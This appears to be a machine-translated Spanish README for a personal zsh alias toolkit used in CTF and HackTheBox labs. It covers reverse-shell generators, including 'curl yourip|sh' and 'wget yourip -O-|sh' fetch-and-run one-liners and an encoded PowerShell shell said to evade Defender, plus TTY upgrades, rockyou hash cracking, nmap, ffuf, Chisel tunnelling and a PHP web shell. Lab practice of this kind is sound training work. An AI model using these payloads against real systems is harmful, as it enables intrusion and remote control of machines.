# Cosas para CTFs, HTB, THM, etc
Contiene alias y scripts que uso frecuentemente. Solo clona este repositorio **en tu carpeta de inicio** y ejecuta `echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc`. Después de reiniciar zsh deberías poder usar todos los alias y scripts. Solo probado en Kali Linux, puede que necesites instalar dependencias adicionales en otras distribuciones. 
> #### Descargo de responsabilidad
> La mayoría de esos alias probablemente sean malos, siéntete libre de enviar una solicitud de extracción para reducir la "pepeganidad". Para mí, el hecho de que funcione es suficiente para usarlos por ahora :D
## Varios
### > www

Inicia un servidor HTTP en el puerto 80 en el directorio actual. También imprime una lista de las direcciones IP asociadas a cada NIC, muestra la ruta del directorio actual y lista los archivos. 
Ejemplo:
```
┌──(jazz㉿kali)-[/tmp/www]
└─$ www
[eth0] 192.168.172.128
[/tmp/www]
linpeas.sh  pspy64
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
> #### Notas
> - Se utiliza sudo para asegurar la capacidad de escuchar en el puerto 80

### > tun0

Copia la dirección IP de la interfaz tun0 al portapapeles. 
Ejemplo: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tun0 
```
Contenido del portapapeles después:
```
10.10.14.41
```

### > mkdir_cd
A menudo, cuando creo un directorio, quiero entrar directamente en él con `cd` después. Esto hace exactamente eso.  
Ejemplo: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ mkdir_cd pepega

┌──(jazz㉿kali)-[~/jazz/pepega]
└─$ 
```

## Shells inversos
### > gen_lin_rev $ip $port 
Basado en [RSaaS](https://github.com/lukechilds/reverse-shell). Crea un archivo llamado `index.html` en el directorio actual. Este archivo contiene múltiples cargas útiles de shell inverso que se intentarán en secuencia hasta que una funcione. Puede usarse con `www` para hacer que generar un shell inverso tras obtener RCE sea extremadamente fácil y rápido. Solo hay que hacer que el objetivo ejecute `curl tuip|sh` y recuperará la carga útil del shell inverso desde tu servidor web y -esperemos- se conectará a tu escucha. 
Ejemplo:
```
┌──(jazz㉿kali)-[~]
└─$ gen_lin_rev 127.0.0.1 1337
[+] Wrote Linux reverse shells to /home/jazz/index.html
```
> #### Notas
> - Me gusta mucho cómo la carga útil `curl yourip|sh` realmente no tiene caracteres malos además posiblemente del espacio y la barra vertical. Cuando los espacios son un problema, hay [formas de evitar esto](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces) y la barra vertical puede ser evitada simplemente descargando y ejecutando por separado.
> - Si curl no está instalado en la máquina remota, puedes probar `wget yourip -O-|sh`
 
### > gen_php_rev $ip $port

Genera el [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) con la ip y puerto suministrados y lo guarda en el directorio actual.  
Ejemplo:

```
┌──(jazz㉿kali)-[~]
└─$ gen_php_rev 127.0.0.1 1337                                                              
[+] Wrote PHP reverse shell to /home/jazz/jazz.php
```
### > gen_ps_rev $ip $port
Genera un shell reverso de Powershell con la IP y puerto suministrados que en el momento del último uso evitó defender. No estoy seguro a quién darle crédito por esta carga útil. 
Ejemplo:
```
┌──(jazz㉿kali)-[~]
└─$ gen_ps_rev 127.0.0.1 1337
```
Contenido del portapapeles después:
```
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...
```

## Actualizaciones de TTY
### > uptty
Copia el comando de actualización tty de python(2) y python3 al portapapeles. 
Ejemplo: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ uptty
```
Contenido del portapapeles después:
```
python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'
```
> #### Notas
> - Requiere que `xclip` esté instalado
> - `py_tty_upgrade` y `py3_tty_upgrade` todavía están incluidos por ahora pero llamarán a este alias en su lugar

### > script_tty_upgrade
Cuando Python no está instalado en la máquina remota, puedes usar este comando para copiar el método `script` para actualizar a una shell tty en tu portapapeles. 
Ejemplo: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ script_tty_upgrade
```
Contenido del portapapeles después:
```
/usr/bin/script -qc /bin/bash /dev/null
```
> #### Notas
> - Requiere que `xclip` esté instalado

### > tty_fix
Ejecuta `stty raw -echo; fg; reset` y debe usarse después de usar una de las actualizaciones de tty mencionadas arriba.

### > tty_conf
Obtiene la configuración actual del tty (número de filas y columnas) y copia un comando de una línea al portapapeles que puede pegarse directamente en la ventana de tu shell inverso para que esas configuraciones coincidan. Esto soluciona el problema del ajuste de línea que ocurre a mitad de tu terminal. 
Ejemplo: 
```
┌──(jazz㉿kali)-[~/jazz]
└─$ tty_conf               
```
Contenido del portapapeles después:
```
stty rows 30 columns 116
```
> #### Notas
> - Requiere que `xclip` esté instalado

## Crackeo de hashes
### > rock_john $archivo_hash (argumentos adicionales)
En lugar de suministrar manualmente rockyou como argumento con `--wordlist=/usr/share/wordlists/rockyou.txt` (sin autocompletado :/) este alias inyecta ese argumento y por lo tanto puede usarse para intentar crackear un hash usando JohnTheRipper y la lista de palabras rockyou más fácilmente.
Ejemplo:
```
┌──(jazz㉿kali)-[~/jazz]
└─$ rock_john hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
jazz             (?)     
1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```
> #### Notas
> - ¡Parece que Kali solucionó la autocompletación para John en 2022.2! Sin embargo, este alias aún te ahorra algo de esfuerzo ;)
## Escaneo de puertos
### > nmap_tcp $ip (argumentos adicionales)
Inicia un escaneo TCP con nmap usando mis configuraciones predeterminadas y guarda los resultados del escaneo en un directorio nmap que se crea automáticamente si aún no existe.
Ejemplo:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_default 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
...
```
> #### Notas
> - Esto solo escanea los puertos TCP predeterminados. Añade `-p-` como argumento para escanear todos los puertos.
> - Usa `sudo` para obtener los privilegios necesarios para un escaneo SYN
### > nmap_udp $ip (argumentos adicionales)
Inicia un escaneo UDP con nmap usando mis configuraciones predeterminadas y guarda los resultados en un directorio nmap que se crea automáticamente si no existe aún.
Ejemplo:
```
┌──(jazz㉿kali)-[~]
└─$ nmap_udp 127.0.0.1
[i] Creating /home/jazz/nmap...
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
...
```
> #### Notas
> - Esto solo escanea los puertos UDP predeterminados. Añade `-p-` como argumento para escanear todos los puertos.
> - Usa `sudo` para obtener los privilegios necesarios para un escaneo UDP


## Ruta de SecLists

> #### Notas
> - Muchas de las funciones en este conjunto de herramientas usan listas de palabras del proyecto SecLists. Para asegurar que estas funciones funcionen correctamente, los scripts necesitan saber dónde encontrar el directorio SecLists. El conjunto de herramientas usa la siguiente lógica para localizar SecLists:

1. Primero, verifica si existe `/opt/seclists/`.
2. Si no, verifica si existe `/usr/share/seclists/`.
3. Si ninguno de estos directorios existe, busca una variable de entorno llamada `SECLISTS_PATH`.

Para configurar SecLists para usar con estos scripts:

1. Instala SecLists en una de las ubicaciones estándar (`/opt/seclists/` o `/usr/share/seclists/`).
   
   O

2. Configura la variable de entorno `SECLISTS_PATH` para que apunte a tu instalación de SecLists:

   ```bash
   export SECLISTS_PATH="/path/to/seclists"
   # You can add this line to your .zshrc file to make it permanent.
    ```

## Fuzzing Web
### > vhost $domain (-w lista_de_palabras) (argumentos extra)
Realiza el descubrimiento de host virtual usando ffuf.
Ejemplo:
```
┌──(22sh㉿kali)-[~]
└─$ vhost box.htb
```
> #### Notas
> - Al pasar solo el dominio se usará http, sin embargo, también puedes pasar la url completa https://box.htb para https
> - Requiere que `ffuf` esté instalado
### > fuzz_dir $url (argumentos extra)
Realiza fuzzing de directorios y archivos usando ffuf.
Ejemplo:
```
┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -fs 245

┌──(22sh㉿kali)-[~]
└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
```
> #### Notas
> - Requiere tener instalado `ffuf`
## Tunelización con Chisel
### > chisel_socks $ip $port
Configura un proxy SOCKS usando Chisel y copia el comando al portapapeles.
Ejemplo:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_socks 10.10.14.10 8888
[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
2024/08/05 23:31:03 server: Reverse tunnelling enabled
2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
```
### > chisel_forward $local_ip $local_port $remote_ip $remote_port
Configura el reenvío de puertos usando Chisel.
Ejemplo:

```
┌──(22sh㉿kali)-[~/jazz]
└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
[+] Run this on the target machine
2024/08/05 23:32:30 server: Reverse tunnelling enabled
2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
```
## Gestión de Hosts
### > addhost $ip $hostname
Agrega o actualiza una entrada en el archivo /etc/hosts.
Ejemplo:
```
┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.234 big.box.htb 
[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
10.10.11.234 boss.htb big.boss.htb big.box.htb


┌──(22sh㉿kali)-[~/jazz]
└─$ addhost 10.10.11.235 newbox.htb 
[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
10.10.11.235 newbox.htb
```
## Alias adicionales
- `linpeas`: Descarga la última versión de LinPEAS.
- `upload`: Sube un archivo usando bashupload.com.
- `phpcmd`: Crea una web shell PHP simple.
- `burl`: curl usando el proxy de burpsuite.



---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2026-05-07

---